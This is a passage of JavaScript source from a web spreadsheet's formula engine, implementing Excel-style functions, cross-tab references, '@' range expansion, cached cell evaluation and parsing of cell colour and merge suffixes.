    .replace(/(?<![A-Za-z])DEGREES\(([^()]+)\)/gi, function(_, a) { return resolveValue(a) * 180 / Math.PI; })
    .replace(/(?<![A-Za-z])RADIANS\(([^()]+)\)/gi, function(_, a) { return resolveValue(a) * Math.PI / 180; })
    .replace(/(?<![A-Za-z])ABS\(([^()]+)\)/gi, function(_, a) { return Math.abs(resolveValue(a)); })
    .replace(/(?<![A-Za-z])SQRT\(([^()]+)\)/gi, function(_, a) { return Math.sqrt(resolveValue(a)); })
    .replace(/(?<![A-Za-z])SIGN\(([^()]+)\)/gi, function(_, a) { return Math.sign(resolveValue(a)); })
    .replace(/(?<![A-Za-z])EXP\(([^()]+)\)/gi, function(_, a) { return Math.exp(resolveValue(a)); })
    .replace(/(?<![A-Za-z])LN\(([^()]+)\)/gi, function(_, a) { return Math.log(resolveValue(a)); })
    .replace(/(?<![A-Za-z])LOG10\(([^()]+)\)/gi, function(_, a) { return Math.log10(resolveValue(a)); })
    .replace
    (
      /(?<![A-Za-z])LOG\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            base = args[1] !== undefined ? resolveValue(args[1]) : 10;

        return Math.log(num) / Math.log(base);
      }
    )
    .replace(/(?<![A-Za-z])PI\(\)/gi, function() { return Math.PI; })
    .replace(/(?<![A-Za-z])RAND\(\)/gi, function() { return Math.random(); })
    .replace
    (
      /(?<![A-Za-z])RANDBETWEEN\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            lo = resolveValue(args[0]),
            hi = resolveValue(args[1]);

        return Math.floor(Math.random() * (hi - lo + 1)) + lo;
      }
    )
    .replace
    (
      /(?<![A-Za-z])POWER\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a);
        return Math.pow(resolveValue(args[0]), resolveValue(args[1]));
      }
    )
    .replace
    (
      /(?<![A-Za-z])MOD\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a);
        return resolveValue(args[0]) % resolveValue(args[1]);
      }
    )
    .replace
    (
      /(?<![A-Za-z])TRUNC\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            digits = args[1] !== undefined ? resolveValue(args[1]) : 0,
            factor = Math.pow(10, digits);

        return Math.trunc(num * factor) / factor;
      }
    )
    .replace(/(?<![A-Za-z])INT\(([^()]+)\)/gi, function(_, a) { return Math.floor(resolveValue(a)); })
    .replace
    (
      /(?<![A-Za-z])CEILING\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            sig = args[1] !== undefined ? resolveValue(args[1]) : 1;

        return sig ? Math.ceil(num / sig) * sig : 0;
      }
    )
    .replace
    (
      /(?<![A-Za-z])FLOOR\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            sig = args[1] !== undefined ? resolveValue(args[1]) : 1;

        return sig ? Math.floor(num / sig) * sig : 0;
      }
    )
    .replace
    (
      /(?<![A-Za-z])CONCATENATE\(([^()]+)\)/gi,
      function(_, a)
      {
        return formatForExpr(splitTopLevelArgs(a).map(resolveValue).join(''));
      }
    )
    .replace
    (
      /(?<![A-Za-z])CONCAT\(([^()]+)\)/gi,
      function(_, a)
      {
        return formatForExpr(splitTopLevelArgs(a).map(resolveValue).join(''));
      }
    )
    .replace(/(?<![A-Za-z])LEN\(([^()]+)\)/gi, function(_, a) { return String(resolveValue(a)).length; })
    .replace(/(?<![A-Za-z])UPPER\(([^()]+)\)/gi, function(_, a) { return formatForExpr(String(resolveValue(a)).toUpperCase()); })
    .replace(/(?<![A-Za-z])LOWER\(([^()]+)\)/gi, function(_, a) { return formatForExpr(String(resolveValue(a)).toLowerCase()); })
    .replace(/(?<![A-Za-z])TRIM\(([^()]+)\)/gi, function(_, a) { return formatForExpr(String(resolveValue(a)).trim()); })
    .replace
    (
      /(?<![A-Za-z])LEFT\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            text = String(resolveValue(args[0])),
            n = args[1] !== undefined ? resolveValue(args[1]) : 1;

        return formatForExpr(text.slice(0, n));
      }
    )
    .replace
    (
      /(?<![A-Za-z])RIGHT\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            text = String(resolveValue(args[0])),
            n = args[1] !== undefined ? resolveValue(args[1]) : 1;

        return formatForExpr(n ? text.slice(-n) : '');
      }
    )
    .replace
    (
      /(?<![A-Za-z])MID\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            text = String(resolveValue(args[0])),
            start = resolveValue(args[1]),
            count = resolveValue(args[2]);

        return formatForExpr(text.substr(start - 1, count));
      }
    )
    .replace
    (
      /(?<![A-Za-z])SUBSTITUTE\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            text = String(resolveValue(args[0])),
            oldText = String(resolveValue(args[1])),
            newText = String(resolveValue(args[2]));

        if (!oldText)
          return formatForExpr(text);

        // Optional 4th argument: replace only the n-th occurrence.
        if (args[3] !== undefined)
        {
          var n = resolveValue(args[3]),
              at = -1;

          for (var i = 0; i < n; i++)
          {
            at = text.indexOf(oldText, at + 1);
            if (at === -1) break;
          }

          return formatForExpr(at === -1 ? text : text.slice(0, at) + newText + text.slice(at + oldText.length));
        }

        return formatForExpr(text.split(oldText).join(newText));
      }
    )
    .replace
    (
      /(?<![A-Za-z])REPT\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            text = String(resolveValue(args[0])),
            times = Math.max(0, Math.floor(resolveValue(args[1])));

        return formatForExpr(new Array(times + 1).join(text));
      }
    )
    .replace
    (
      /(?<![A-Za-z])FIND\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            needle = String(resolveValue(args[0])),
            hay = String(resolveValue(args[1])),
            start = args[2] !== undefined ? resolveValue(args[2]) : 1,
            at = hay.indexOf(needle, start - 1);

        if (at === -1)
          throw new Error('FIND: not found');

        return at + 1;
      }
    )
    .replace
    (
      /(?<![A-Za-z])SEARCH\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            needle = String(resolveValue(args[0])).toLowerCase(),
            hay = String(resolveValue(args[1])).toLowerCase(),
            start = args[2] !== undefined ? resolveValue(args[2]) : 1,
            at = hay.indexOf(needle, start - 1);

        if (at === -1)
          throw new Error('SEARCH: not found');

        return at + 1;
      }
    )
    .replace
    (
      /(?<![A-Za-z])PROPER\(([^()]+)\)/gi,
      function(_, a)
      {
        var text = String(resolveValue(a)).replace
        (
          /[A-Za-z]+/g,
          function(word) { return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase(); }
        );

        return formatForExpr(text);
      }
    )
    .replace
    (
      /(?<![A-Za-z])EXACT\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a);
        return String(resolveValue(args[0])) === String(resolveValue(args[1]));
      }
    )
    .replace
    (
      /(?<![A-Za-z])IFERROR\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a);

        try
        {
          var primary = resolveValue(args[0]);

          if (typeof primary === 'number' && (isNaN(primary) || !isFinite(primary)))
            throw new Error('bad number');

          return formatForExpr(primary);
        }
        catch (e)
        {
          return formatForExpr(resolveValue(args[1]));
        }
      }
    )
    .replace
    (
      /(?<![A-Za-z])IF\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            cond = resolveValue(args[0]);

        return formatForExpr(cond ? resolveValue(args[1]) : resolveValue(args[2]));
      }
    )
    .replace
    (
      /(?<![A-Za-z])AND\(([^()]+)\)/gi,
      function(_, a)
      {
        return splitTopLevelArgs(a).every(function(x) { return !!resolveValue(x); });
      }
    )
    .replace
    (
      /(?<![A-Za-z])OR\(([^()]+)\)/gi,
      function(_, a)
      {
        return splitTopLevelArgs(a).some(function(x) { return !!resolveValue(x); });
      }
    )
    .replace(/(?<![A-Za-z])NOT\(([^()]+)\)/gi, function(_, a) { return !resolveValue(a); })
    .replace
    (
      /(?<![A-Za-z])XOR\(([^()]+)\)/gi,
      function(_, a)
      {
        return splitTopLevelArgs(a).filter(function(x) { return !!resolveValue(x); }).length % 2 === 1;
      }
    )
    .replace
    (
      /(?<![A-Za-z])ROUNDUP\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            digits = args[1] !== undefined ? resolveValue(args[1]) : 0,
            factor = Math.pow(10, digits);

        // Away from zero, like Excel.
        return Math.sign(num) * Math.ceil(Math.abs(num) * factor) / factor;
      }
    )
    .replace
    (
      /(?<![A-Za-z])ROUNDDOWN\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            digits = args[1] !== undefined ? resolveValue(args[1]) : 0,
            factor = Math.pow(10, digits);

        // Toward zero, like Excel.
        return Math.sign(num) * Math.floor(Math.abs(num) * factor) / factor;
      }
    )
    .replace
    (
      /(?<![A-Za-z])FACT\(([^()]+)\)/gi,
      function(_, a)
      {
        var n = Math.floor(resolveValue(a));

        if (n < 0)
          throw new Error('FACT of a negative number');

        var result = 1;
        for (var i = 2; i <= n; i++)
          result *= i;

        return result;
      }
    )
    .replace
    (
      /(?<![A-Za-z])EVEN\(([^()]+)\)/gi,
      function(_, a)
      {
        var num = resolveValue(a);
        return Math.sign(num) * Math.ceil(Math.abs(num) / 2) * 2;
      }
    )
    .replace
    (
      /(?<![A-Za-z])ODD\(([^()]+)\)/gi,
      function(_, a)
      {
        var num = resolveValue(a);
        if (!num) return 1;
        return Math.sign(num) * (2 * Math.ceil((Math.abs(num) + 1) / 2) - 1);
      }
    )
    .replace
    (
      /(?<![A-Za-z])ROUND\(([^()]+)\)/gi,
      function(_, a)
      {
        var args = splitTopLevelArgs(a),
            num = resolveValue(args[0]),
            decimals = args[1] !== undefined ? resolveValue(args[1]) : 0;

        return Number(num.toFixed(decimals));
      }
    );
}

// Evaluates a cell that lives on another tab: the whole formula engine reads
// the global sheetData, so swap the alias for the duration of the call. The
// eval cache is keyed by bare refs, so it must not survive the swap in
// either direction.
function evalCellOnPage(page, ref, val)
{
  if (page.data === sheetData)
    return evalCell(ref, val);

  var saved = sheetData;
  sheetData = page.data;
  clearEvalCache();
  try { return evalCell(ref, val); }
  finally { sheetData = saved; clearEvalCache(); }
}

// Cross-tab references use the link-like syntax [Tab name](A1). Resolved
// before anything else so they compose with functions: =SUM([Costs](B2), 5).
// Unknown tab names come back as "#REF".
function substitutePageRefs(exprText)
{
  return exprText.replace
  (
    /\[([^\]]+)\]\(\s*\$?([A-Z]{1,2})\$?(\d+)\s*\)/g,
    function(_, pageName, c, r)
    {
      var target = pageName.trim().toLowerCase();
      var page = sheetPages.find(function(p){ return p.name.trim().toLowerCase() === target; });
      if (!page)
        return '"#REF"';

      var ref = c + r,
          v = page.data[ref];

      if (v === undefined || v === '')
        return '0';

      if (v.startsWith('='))
        v = evalCellOnPage(page, ref, v);

      var upper = String(v).toUpperCase();
      if (upper === 'TRUE' || upper === 'FALSE')
        return upper.toLowerCase();

      var num = parseFloat(v);

      if (isNaN(num))
        return JSON.stringify(v);

      // Parenthesize negatives so "A1-B1" with a negative B1 doesn't
      // collapse into the JS "--" operator.
      return num < 0 ? '(' + v + ')' : v;
    }
  );
}

// Refs currently being evaluated, so a formula that (directly or through a
// whole-column range like SUM(A:A) sitting inside column A) references
// itself resolves the cycle as 0 instead of recursing forever.
var evalCellInProgress = {};

// Memoized formula results. Within one recalculation pass the same cell gets
// evaluated over and over (every range that covers it re-reads it, the save
// serializer evaluates it again, charts again) — without a cache, a sheet of
// chained or whole-column formulas recalculates quadratically on every
// keystroke. Cleared at the start of each pass and whenever the sheetData
// alias switches pages, so entries can never outlive the data they came from.
var evalCellCache = {};

function clearEvalCache()
{
  evalCellCache = {};
}

// ── @ RANGES (elementwise / line-per-line operations) ──
// Two complementary behaviors, matching how Excel treats arrays vs implicit
// intersection:
//
//  1. Inside an aggregate function, an argument mixing @ranges with
//     operators is expanded one element per line and handed to the function
//     as a plain value list: =SUM(@I18:I22*@J18:J22) becomes
//     SUM(I18*J18, I19*J19, …) — a single SUMPRODUCT-style result.
//  2. Anywhere else, @range picks the one value on the formula's own
//     row/column, so =@A1:A9*@B1:B9 filled down computes each line's pair.

var AT_EXPANDING_FUNCTIONS = {
  SUM: 1, AVG: 1, AVERAGE: 1, MEAN: 1, MAX: 1, MIN: 1, MEDIAN: 1,
  PRODUCT: 1, STDEV: 1, VAR: 1, COUNT: 1, COUNTA: 1, LARGE: 1, SMALL: 1
};

// Matches quoted strings (passed through) or an @range (captured).
var AT_RANGE_RE = /"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|@\s*(\$?[A-Z]{1,2}\$?\d+\s*:\s*\$?[A-Z]{1,2}\$?\d+|\$?[A-Z]{1,2}\s*:\s*\$?[A-Z]{1,2}|\$?\d+\s*:\s*\$?\d+)/g;

// Rewrites one paren/comma-free argument segment ("@A1:A3*@B1:B3+2") into a
// comma-separated element list ("A1*B1+2,A2*B2+2,A3*B3+2"). Scalars repeat
// on every line; all @ranges in the segment must have the same size.
function expandAtSegment(segment)
{
  var ranges = [],
      m;

  AT_RANGE_RE.lastIndex = 0;
  while ((m = AT_RANGE_RE.exec(segment)))
    if (m[1] !== undefined) ranges.push(m[1]);

  if (!ranges.length)
    return segment; // only @A5-style single refs — implicit intersection's job

  var refLists = ranges.map(function(r){ return getRangeRefs(r.replace(/[\s$]/g, '')); }),
      len = refLists[0].length;

  refLists.forEach(function(list)
  {
    if (list.length !== len)
      throw new Error('@ ranges in one expression must be the same size');
  });

  if (!len)
    throw new Error('@ range is empty');

  var elements = [];

  for (var k = 0; k < len; k++)
  {
    var idx = 0;
    elements.push(segment.replace(AT_RANGE_RE, function(match, r)
    {
      return r === undefined ? match : refLists[idx++][k];
    }));
  }

  return elements.join(',');
}

// Walks the formula tracking which function call each piece sits inside;
// @-bearing segments whose innermost enclosing call is an aggregate get
// elementwise expansion. Everything else is left for implicit intersection.
function expandArrayOps(expr)
{
  if (expr.indexOf('@') === -1)
    return expr;

  var result = '',
      segment = '',
      stack = [],
      i = 0;

  function flush()
  {
    var context = stack.length ? stack[stack.length - 1] : null;

    if (context && context.agg && segment.indexOf('@') !== -1)
      result += expandAtSegment(segment);
    else
      result += segment;

    segment = '';
  }

  while (i < expr.length)
  {
    var ch = expr.charAt(i);

    // Quoted strings ride along inside the segment untouched (and their
    // commas/parens don't count as delimiters).
    if (ch === '"' || ch === "'")
    {
      var j = i + 1;
      while (j < expr.length && expr.charAt(j) !== ch)
        j += (expr.charAt(j) === '\\') ? 2 : 1;
      segment += expr.slice(i, j + 1);
      i = j + 1;
      continue;
    }

    if (ch === '(')
    {
      var nameMatch = /([A-Za-z]+)\s*$/.exec(segment),
          fnName = nameMatch ? nameMatch[1].toUpperCase() : null;
      flush();
      result += '(';
      stack.push({ agg: !!(fnName && AT_EXPANDING_FUNCTIONS[fnName]) });
      i++;
      continue;
    }

    if (ch === ')')
    {
      flush();
      result += ')';
      stack.pop();
      i++;
      continue;
    }

    if (ch === ',')
    {
      flush();
      result += ',';
      i++;
      continue;
    }

    segment += ch;
    i++;
  }

  flush();
  return result;
}

// Excel-style implicit intersection: @range picks the single value from the
// range that lines up with the formula's own row (or column, for horizontal
// ranges) — the "same line as me" operator. Fill =@A1:A9*@B1:B9 down beside
// the data and each row multiplies its own pair; whole columns work too
// (=@A:A*@B:B). A range that doesn't cross the formula's line is an error,
// like Excel's #VALUE!.
function substituteImplicitIntersection(exprText, selfRef)
{
  var self = parseName((selfRef || '').replace(/\$/g, ''));

  return exprText.replace
  (
    /"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|@\s*(\$?[A-Z]{1,2}\$?\d+\s*:\s*\$?[A-Z]{1,2}\$?\d+|\$?[A-Z]{1,2}\s*:\s*\$?[A-Z]{1,2}|\$?\d+\s*:\s*\$?\d+|\$?[A-Z]{1,2}\$?\d+)/g,
    function(match, rangeText)
    {
      if (rangeText === undefined)
        return match; // quoted string — leave alone

      if (!self)
        throw new Error('@ needs a host cell');

      var clean = rangeText.replace(/[\s$]/g, ''),
          m;

      // @A5 on a plain ref is a no-op.
      if ((m = clean.match(/^([A-Z]{1,2})(\d+)$/)))
        return m[1] + m[2];

      var selfCol = colIndex(self.col),
          rowLo = null, rowHi = null,
          colLo = null, colHi = null;

      if ((m = clean.match(/^([A-Z]{1,2})(\d+):([A-Z]{1,2})(\d+)$/)))
      {
        colLo = Math.min(colIndex(m[1]), colIndex(m[3]));
        colHi = Math.max(colIndex(m[1]), colIndex(m[3]));
        rowLo = Math.min(+m[2], +m[4]);
        rowHi = Math.max(+m[2], +m[4]);
      }
      else if ((m = clean.match(/^([A-Z]{1,2}):([A-Z]{1,2})$/)))
      {
        colLo = Math.min(colIndex(m[1]), colIndex(m[2]));
        colHi = Math.max(colIndex(m[1]), colIndex(m[2]));
      }
      else if ((m = clean.match(/^(\d+):(\d+)$/)))
      {
        rowLo = Math.min(+m[1], +m[2]);
        rowHi = Math.max(+m[1], +m[2]);
      }
      else
        return match;

      // Pick the row: a single-row range contributes its one row; a span (or
      // an unbounded whole-column dimension) must contain the formula's row.
      var row, col;

      if (rowLo === null || (rowLo !== rowHi && self.row >= rowLo && self.row <= rowHi))
        row = self.row;
      else if (rowLo === rowHi)
        row = rowLo;
      else
        throw new Error('@' + rangeText + ' does not reach row ' + self.row);

      if (colLo === null || (colLo !== colHi && selfCol >= colLo && selfCol <= colHi))
        col = selfCol;
      else if (colLo === colHi)
        col = colLo;
      else
        throw new Error('@' + rangeText + ' does not reach column ' + self.col);

      return colName(col) + row;
    }
  );
}

function evalCell(ref, val)
{
  if (!val || !val.startsWith('='))
    return val;

  if (evalCellInProgress[ref])
    return '0';

  var cached = evalCellCache[ref];
  if (cached && cached.val === val)
    return cached.result;

  evalCellInProgress[ref] = true;

  var out;

  try
  {
    var expr = substituteImplicitIntersection(expandArrayOps(substitutePageRefs(val.slice(1))), ref),
        previous,
        iterations = 25;

    do
    {
      previous = expr;
      expr = applyFunctionPass(expr, ref);

      // When no function matched (their arg regexes require paren-free
      // arguments), collapse innermost BARE (…) groups to values so e.g.
      // MAX((A1+1)*2, 5) flattens to MAX(4,5) for the next pass — plain
      // parenthesised sub-expressions resolve before anything around them.
      if (expr === previous)
        expr = resolveBareGroups(expr);
    }
    while (expr !== previous && --iterations > 0);

    expr = sanitizeExprForEval(substituteCellRefs(expr));

    var result = evalFinalExpr(expr);

    if (typeof result === 'boolean')
      out = result ? 'TRUE' : 'FALSE';
    else if (typeof result === 'string')
      out = result;
    else
      out =  (isNaN(result) || !isFinite(result))
             ?
               '#ERR'
             :
               parseFloat(result.toFixed(10)).toString();
  }
  catch(e)
  {
    out = '#ERR';
  }
  finally
  {
    delete evalCellInProgress[ref];
  }

  evalCellCache[ref] = { val: val, result: out };

  return out;
}

function evaluateFormulas(skipRef)
{
  // Fresh pass: anything might have changed since the last one.
  clearEvalCache();

  Object.keys(sheetData).forEach
  (
    function(ref)
    {
      // Skip the cell currently being typed into - overwriting it mid-edit
      // would clobber the raw formula text the user hasn't finished typing.
      if (ref === skipRef)
        return;

      var val=sheetData[ref];

      if(val && val.startsWith('='))
      {
        var inp = document.getElementById('inp-' + ref);
        if (inp)
        {
          inp.value = evalCell(ref, val);
          inp.classList.add('formula-result');
        }
      }
    }
  );

  refreshSheetCharts();
}

// Strips the cell-decoration suffixes off a serialized cell line's payload
// (everything after "REF="): a trailing `;#hex` paints the background, a
// trailing `;txt#hex` paints the text, and a trailing `:B2,B3` lists cells
// merged into this one. They may be chained in any order
// (B1=5:B2,B3;#FAFAFA == B1=5;#FAFAFA:B2,B3) — all parse the same because
// stripping repeats from the end until nothing matches.
function stripCellSuffixes(rest)
{
  var color = null,
      textColor = null,
      merged = null,
      changed = true;

  while (changed)
  {
    changed = false;

    var mt = rest.match(/;txt(#[0-9A-Fa-f]{3}(?:[0-9A-Fa-f]{3})?(?:[0-9A-Fa-f]{2})?)\s*$/);
    if (mt && textColor === null)
    {
      textColor = mt[1];
      rest = rest.slice(0, rest.length - mt[0].length);
      changed = true;
      continue;
    }

    var mc = rest.match(/;(#[0-9A-Fa-f]{3}(?:[0-9A-Fa-f]{3})?(?:[0-9A-Fa-f]{2})?)\s*$/);
    if (mc && color === null)
    {
      color = mc[1];
      rest = rest.slice(0, rest.length - mc[0].length);
      changed = true;
      continue;
    }

    var mm = rest.match(/:(\$?[A-Z]{1,2}\$?\d+(?:\s*,\s*\$?[A-Z]{1,2}\$?\d+)*)\s*$/);
    if (mm && merged === null)
    {
      merged = mm[1].split(',').map(function(t){ return t.trim().replace(/\$/g, ''); });
      rest = rest.slice(0, rest.length - mm[0].length);
      changed = true;
      continue;
    }
  }

  return { rest: rest, color: color, textColor: textColor, merged: merged };
}
